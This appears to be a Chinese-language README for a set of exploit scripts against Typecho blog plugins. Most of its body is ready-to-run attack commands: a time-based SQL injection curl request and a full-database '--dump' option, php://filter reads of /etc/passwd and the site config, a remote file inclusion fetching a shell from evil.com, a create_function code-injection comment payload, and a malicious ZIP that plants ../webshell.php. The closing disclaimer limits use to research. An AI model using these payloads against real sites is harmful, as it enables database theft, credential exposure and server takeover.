# PHP 代码审计 POC 脚本

本目录包含 Typecho 插件安全审计中发现的高危漏洞 **实际利用脚本**，可直接在目标网站上验证漏洞存在。

## 漏洞列表

| # | 漏洞 | CVSS | 利用脚本 | 目标 |
|---|-----|------|---------|------|
| 1 | AUTO-UPDATE.php 命令注入 | 9.0 | `exploit_auto_update.py` | 本地文件分析 |
| 2 | PostRating SQL 注入 | 8.8 | `exploit_postrating.py` | http://127.0.0.1/typecho/ |
| 3 | MyPlayer 文件包含 | 8.5 | `exploit_myplayer.py` | http://127.0.0.1/typecho/MyPlayer/api.php |
| 4 | AntiSpam create_function RCE | 7.5 | `exploit_antispam.py` | http://127.0.0.1/typecho/ |
| 5 | TeStore ZIP 路径遍历 | 7.5 | `exploit_testore.py` | 生成恶意 ZIP |

## 快速开始

### 1. PostRating SQL 注入

```bash
# 测试目标是否存在漏洞
python3 exploit_postrating.py http://127.0.0.1/typecho/

# 如果找到 endpoint，自动进行漏洞测试
# 如果存在漏洞，会显示 "VULNERABLE! Time-based SQL injection confirmed!"

# 提取数据库信息
python3 exploit_postrating.py http://127.0.0.1/typecho/PostRating/rating.php --extract

# 完整拖库
python3 exploit_postrating.py http://127.0.0.1/typecho/PostRating/rating.php --dump
```

### 2. MyPlayer 文件包含

```bash
# 扫描 API
python3 exploit_myplayer.py http://127.0.0.1/typecho/ --scan

# 读取本地文件
python3 exploit_myplayer.py http://127.0.0.1/typecho/ --read /etc/passwd

# 读取配置文件
python3 exploit_myplayer.py http://127.0.0.1/typecho/ --config

# 远程文件包含（RCE）
python3 exploit_myplayer.py http://127.0.0.1/typecho/ --rfi http://evil.com/shell.txt
```

### 3. AntiSpam create_function RCE

```bash
# 测试漏洞
python3 exploit_antispam.py http://127.0.0.1/typecho/

# 漏洞利用条件：
# - PHP 5.x 或 PHP 7.0-7.1 (create_function 在 7.2+ 被移除)
# - AntiSpam 插件已安装并启用
# - 在文章页面提交评论
```

### 4. TeStore ZIP 路径遍历

```bash
# 生成恶意 ZIP 文件
python3 exploit_testore.py generate

# 本地测试
python3 exploit_testore.py test

# 完整演示
python3 exploit_testore.py demo
```

### 5. AUTO-UPDATE.php 命令注入

```bash
# 分析本地文件
python3 exploit_auto_update.py C:/phpstudy/WWW/AUTO-UPDATE.php
```

## 手动验证方法

### PostRating SQL 注入

```bash
# 使用 curl 手动测试
curl -X POST "http://127.0.0.1/typecho/PostRating/rating.php" \
  -d "rating=5&cid=1" \
  -H "X-Forwarded-For: 1' AND (SELECT SLEEP(5))-- "

# 如果响应延迟 5 秒，证明漏洞存在
```

### AntiSpam RCE

```bash
# 在评论框中提交以下内容
*/}phpinfo();/*

# 如果页面显示 phpinfo() 输出，证明漏洞存在
```

### MyPlayer LFI

```bash
# 读取 /etc/passwd
curl "http://127.0.0.1/typecho/MyPlayer/api.php?service=php://filter/convert.base64-encode/resource=/etc/passwd"

# 读取 config.inc.php
curl "http://127.0.0.1/typecho/MyPlayer/api.php?service=php://filter/convert.base64-encode/resource=../config.inc.php"
```

## 生成的恶意文件

| 文件 | 说明 |
|-----|------|
| `malicious_testore.zip` | 包含路径遍历文件 `../webshell.php` 的恶意 ZIP |

## 免责声明

这些 POC 脚本仅供安全研究和教育目的使用。请勿用于未经授权的渗透测试或攻击行为。使用者需自行承担风险。
